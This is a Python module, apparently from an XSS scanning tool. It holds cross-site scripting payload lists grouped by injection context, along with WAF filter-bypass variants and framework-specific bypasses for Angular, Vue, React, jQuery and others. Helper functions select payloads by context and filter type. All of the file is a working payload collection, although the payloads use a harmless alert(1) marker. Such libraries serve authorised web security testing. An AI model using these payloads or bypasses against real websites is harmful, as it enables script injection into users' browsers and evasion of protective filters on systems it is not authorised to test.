"""Pre-built XSS payload libraries grouped by injection context."""

from __future__ import annotations


HTML_BODY_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
]

HTML_ATTRIBUTE_PAYLOADS = [
    '"><script>alert(1)</script>',
    '" autofocus onfocus=alert(1) x="',
    "' onmouseover=alert(1) x='",
    "<svg><set attributeName=onmouseover to=alert(1)>",
    '<a href="javascript:alert(1)">click',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    "<svg><animate onbegin=alert(1) attributeName=x>",
]

JS_STRING_PAYLOADS = [
    "';alert(1);//",
    '";alert(1);//',
    "</script><script>alert(1)</script>",
    "${alert(1)}",
    "<script>alert(1)</script>",
    "`;alert(1);//",
    "%27;alert(1);//",
    r"\x3cscript\x3ealert(1)\x3c/script\x3e",
]

URL_PAYLOADS = [
    "javascript:alert(1)",
    "%0ajavascript:alert(1)",
    r"\u003cscript\u003ealert(1)\u003c/script\u003e",
]

STYLESHEET_PAYLOADS = [
    "</style><svg onload=alert(1)>",
    "background-image:url(javascript:alert(1))",
    "@import 'javascript:alert(1)';",
    "</style><img src=x onerror=alert(1)>",
]

COMMENT_PAYLOADS = [
    "--><script>alert(1)</script>",
    "--><img src=x onerror=alert(1)>",
    "--><svg onload=alert(1)>",
]

TEMPLATE_PAYLOADS = [
    "{{constructor.constructor('alert(1)')()}}",
    "{{this.constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "${self['al'+'ert'](1)}",
]

ALL_CONTEXT_PAYLOADS = {
    "HTML_BODY": HTML_BODY_PAYLOADS,
    "HTML_ATTRIBUTE": HTML_ATTRIBUTE_PAYLOADS,
    "HTML_COMMENT": COMMENT_PAYLOADS,
    "JS_STRING": JS_STRING_PAYLOADS,
    "JS_TEMPLATE": TEMPLATE_PAYLOADS,
    "URL_PARAM": URL_PAYLOADS,
    "STYLESHEET": STYLESHEET_PAYLOADS,
    "NO_REFLECTION": HTML_BODY_PAYLOADS + HTML_ATTRIBUTE_PAYLOADS + JS_STRING_PAYLOADS,
}

WAF_BYPASS_VARIANTS = {
    "STRICT_TAG_BLOCK": [
        "<style>@import'javascript:alert(1)'</style>",
        "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>",
        "</textarea><svg/onload=alert(1)>",
        "<math><mi//xlink:href=javascript:alert(1)>",
    ],
    "EVENT_HANDLER_BLOCK": [
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
    ],
    "KEYWORD_BLOCK": [
        "<ScRiPt>top['al'+'ert'](1)</ScRiPt>",
        "<img src=x oNerror=top['al'+'ert'](1)>",
        "<svg/onload=top['al'+'ert'](1)>",
        "<iframe src=java&#x73;cript:top['al'+'ert'](1)>",
        r"\x3csvg onload=top['al'+'ert'](1)\x3e",
    ],
    "ENCODING_BLOCK": [
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "%26lt%3Bsvg%20onload%3Dalert(1)%26gt%3B",
        r"\u003cimg src=x onerror=alert(1)\u003e",
        "&lt;img src=x onerror=alert(1)&gt;",
    ],
    "LENGTH_BLOCK": [
        "<svg/onload=1>",
        '"><svg/onload=1>',
        "';alert?.(1)//",
        "javascript:confirm(1)",
    ],
    "NO_BLOCK": [],
}

FRAMEWORK_BYPASSES = {
    "angular": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{$eval.constructor('alert(1)')()}}",
        "<ng-form><img src=x onerror=alert(1)>",
        '<div ng-bind-html="\'<img src=x onerror=alert(1)>\'"></div>',
    ],
    "react": [
        '<img src=x onerror=alert(1)>',
        '{"__html":"<img src=x onerror=alert(1)>"}',
        "</script><img src=x onerror=alert(1)>",
    ],
    "vue": [
        "{{this.constructor.constructor('alert(1)')()}}",
        '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
        "<img src=x @error=alert(1)>",
    ],
    "jquery": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ],
    "prototype": [
        "<img src=x onerror=alert(1)>",
        "';alert(1);//",
    ],
    "dojo": [
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ],
    "vanilla": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "';alert(1);//",
    ],
    "server-side": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ],
}


def get_payloads_for_context(context: str | None) -> list[str]:
    """Return payloads best aligned to the provided injection context."""
    if not context:
        context = "NO_REFLECTION"
    return list(ALL_CONTEXT_PAYLOADS.get(context, ALL_CONTEXT_PAYLOADS["NO_REFLECTION"]))


def get_standard_payloads() -> dict[str, list[str]]:
    """Return all standard payload sets."""
    return {key: list(values) for key, values in ALL_CONTEXT_PAYLOADS.items()}


def get_waf_bypass_payloads(filter_type: str, context: str | None = None) -> list[str]:
    """Return filter-aware bypasses with context payloads mixed in."""
    payloads: list[str] = []
    if context:
        payloads.extend(get_payloads_for_context(context)[:3])
    payloads.extend(WAF_BYPASS_VARIANTS.get(filter_type, []))
    return _unique(payloads)


def get_framework_payloads(framework_name: str | None) -> list[str]:
    """Return framework-specific payload ideas."""
    if not framework_name:
        framework_name = "vanilla"
    return list(FRAMEWORK_BYPASSES.get(framework_name.lower(), FRAMEWORK_BYPASSES["vanilla"]))


def _unique(values: list[str]) -> list[str]:
    seen: set[str] = set()
    unique_values: list[str] = []
    for value in values:
        if value not in seen:
            seen.add(value)
            unique_values.append(value)
    return unique_values
